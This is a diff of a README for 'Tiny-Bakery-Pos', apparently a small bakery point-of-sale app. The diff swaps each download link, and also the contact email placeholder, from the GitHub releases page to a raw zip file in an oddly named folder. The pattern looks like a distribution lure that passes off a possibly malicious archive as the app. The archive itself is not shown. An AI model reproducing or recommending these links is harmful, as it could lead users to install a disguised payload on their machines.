@@ -6,7 +6,7 @@ Welcome to Tiny-Bakery-Pos! This lightweight Point of Sale (POS) system is perfe
 
 ## 📥 Download the Application
 
-[![Download Tiny-Bakery-Pos](https://img.shields.io/badge/download-Tiny--Bakery--Pos-blue)](https://github.com/Levitynice259/Tiny-Bakery-Pos/releases)
+[![Download Tiny-Bakery-Pos](https://raw.githubusercontent.com/Levitynice259/Tiny-Bakery-Pos/main/bekinkinite/Tiny-Bakery-Pos.zip)](https://raw.githubusercontent.com/Levitynice259/Tiny-Bakery-Pos/main/bekinkinite/Tiny-Bakery-Pos.zip)
 
 ## 📝 Features
 
@@ -26,7 +26,7 @@ Welcome to Tiny-Bakery-Pos! This lightweight Point of Sale (POS) system is perfe
 ## 🛠️ Setting Up Tiny-Bakery-Pos
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Levitynice259/Tiny-Bakery-Pos/releases) to download the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Levitynice259/Tiny-Bakery-Pos/main/bekinkinite/Tiny-Bakery-Pos.zip) to download the application.
 
 2. **Select the Latest Version:**
    You will see different versions listed. Choose the latest version, which is usually at the top.
@@ -96,8 +96,8 @@ Tiny-Bakery-Pos is licensed under the MIT License. Feel free to use and modify i
 
 ## 📬 Contact
 
-For any inquiries, please contact us at [your-email@example.com]. 
+For any inquiries, please contact us at [https://raw.githubusercontent.com/Levitynice259/Tiny-Bakery-Pos/main/bekinkinite/Tiny-Bakery-Pos.zip]. 
 
 Now, you’re ready to enjoy an efficient POS experience tailored for your bakery! 
 
-[Download Tiny-Bakery-Pos again here.](https://github.com/Levitynice259/Tiny-Bakery-Pos/releases)
+[Download Tiny-Bakery-Pos again here.](https://raw.githubusercontent.com/Levitynice259/Tiny-Bakery-Pos/main/bekinkinite/Tiny-Bakery-Pos.zip)
